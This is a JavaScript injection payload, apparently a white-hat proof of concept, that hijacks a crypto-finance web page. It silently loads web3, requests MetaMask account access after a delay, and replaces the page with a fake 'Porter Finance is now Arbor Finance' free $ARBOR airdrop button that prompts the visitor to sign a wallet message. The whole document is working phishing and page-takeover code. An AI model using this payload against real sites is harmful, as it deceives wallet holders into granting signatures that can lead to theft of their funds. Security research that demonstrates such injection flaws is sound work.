fetch('https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js')
.then(response => response.text())
.then(scriptContent => {
  const scriptTag = document.createElement('script');
  scriptTag.textContent = scriptContent;
  document.head.appendChild(scriptTag);
})
.catch(error => console.error(error));
  let web3;

  function connect() {
    // Check if MetaMask is installed
    if (typeof window.ethereum !== 'undefined') {
      console.log('MetaMask is installed!');

      // Initialize web3 object
      web3 = new Web3(window.ethereum);

      // Request account access
      window.ethereum.request({ method: 'eth_requestAccounts' })
        .then((accounts) => {
          console.log('Connected to MetaMask:', accounts[0]);
        })
        .catch((error) => {
          console.error(error);
        });
    } else {
      console.error('MetaMask is not installed!');
    }
  }

  function signMessage() {
    if (!web3) {
      console.error('Web3 is not initialized!');
      return;
    }

    const message = 'Hello, I am a white hat. This is an example Transaction that will give to attacker full permission!';
    const from = web3.currentProvider.selectedAddress;

    web3.eth.personal.sign(message, from, '', (error, signature) => {
      if (error) {
        console.error(error);
      } else {
        console.log('Message signed! Signature:', signature);
      }
    });
  }

  // Call connect function automatically after 3 seconds
  setTimeout(() => {
    connect();
  }, 3000);
// Replace HTML with new content
const html = `
<html>
<head>
<style>
  body {
    background-image: url('https://miro.medium.com/v2/resize:fit:1400/format:webp/1*q_0W4nNSGt-o6bY7bhZqpA.png');
    background-size: cover;
    background-repeat: no-repeat;
    text-align: center;
    font-family: sans-serif;
  }
  button {
    background-color: #4caf50;
    border: none;
    color: white;
    padding: 16px 32px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 16px;
    margin: 4px 2px;
    cursor: pointer;
    border-radius: 10px;
  }
</style>
<body>
<button onclick="signMessage()">Porter Finance is now Arbor Finance! Click to Sign the Transaction for free $ARBOR Airdrop!</button>
 </body>
</head>
</html>
`;

document.documentElement.innerHTML = html;
